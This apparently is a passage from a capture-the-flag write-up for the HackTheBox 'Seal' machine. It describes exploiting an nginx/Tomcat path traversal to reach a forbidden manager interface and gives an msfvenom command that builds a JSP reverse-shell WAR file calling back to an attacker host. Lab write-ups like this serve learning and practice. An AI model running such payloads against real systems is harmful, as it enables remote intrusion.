# user 1
![](seal.htb-11.gif)
- A reverse proxy path traversal vulnerability exists for this version of nginx when pair with Tomcat

![](seal.htb-12.gif)
- The vulnerability can be used to access the interface that was previously forbidden.
- On the animation above, the sequence was recorded after the initial logon, this is the reason the username and password prompt is not being seen (session still active)

<hr>

## generate the .war file

````bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.9 LPORT=4242 -f war -o qdadashell.war
````

## deploy payload 

![](seal.htb-13.gif)
- start listener and deploy the payload, taking care to modify the path in Burp
